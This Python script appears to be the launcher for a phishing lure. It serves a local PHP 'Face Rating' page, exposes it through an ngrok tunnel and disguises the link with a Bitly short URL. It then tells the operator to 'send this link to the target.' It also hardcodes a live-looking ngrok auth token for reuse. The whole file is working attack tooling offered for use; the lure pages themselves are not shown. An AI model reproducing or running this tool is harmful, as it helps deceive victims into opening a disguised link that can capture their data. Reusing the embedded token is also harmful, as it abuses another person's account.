import os, json, time, subprocess
from urllib.parse import urlencode
import requests

def save_token(token):
    with open("ngrok.json", "w") as f:
        json.dump({"token": token}, f)

def load_token():
    if os.path.exists("ngrok.json"):
        with open("ngrok.json", "r") as f:
            return json.load(f).get("token")
    return None

def bitly_short(url):
    try:
        headers = {'Authorization': 'Bearer YOUR_BITLY_TOKEN'}
        data = {"long_url": url}
        r = requests.post("https://api-ssl.bitly.com/v4/shorten", json=data, headers=headers)
        if r.status_code == 200:
            return r.json()["link"]
    except:
        pass
    return url

def start_ngrok():
    subprocess.Popen(["php", "-S", "127.0.0.1:8080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    os.system("killall ngrok > /dev/null 2>&1")
    time.sleep(1)
    subprocess.Popen(["ngrok", "http", "8080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)
    try:
        tunnel = requests.get("http://127.0.0.1:4040/api/tunnels").json()
        url = tunnel["tunnels"][0]["public_url"]
        return url
    except:
        return None

def main():
    print("\n\033[1;31m[!] Turn on your hotspot before continuing!\033[0m\n")
    token = load_token()
    if not token:
        token = input("Enter your Ngrok auth token (use this if don't have one , 2uDpowTCpSNGhcKZDFudAIYVgzY_5eQoEwnb1618PjVwqZJgY ): ").strip()
        save_token(token)
    os.system(f"ngrok config add-authtoken {token}")
    print("\nAvailable templates:\n[1] Face Rating\n")
    input("Select template [1]: ")
    print("\nStarting PHP server on http://127.0.0.1:8080 ...")
    ngrok_url = start_ngrok()
    if not ngrok_url:
        print("Ngrok failed to start.")
        return
    print(f"\nLocalhost Link : http://127.0.0.1:8080")
    print(f"Ngrok Link     : {ngrok_url}")
    shortened = bitly_short(ngrok_url)
    print(f"Short Bitly URL: {shortened}")
    print("\nSend this link to the target.")
    input("\nPress CTRL+C to exit.\n")

if __name__ == "__main__":
    main()
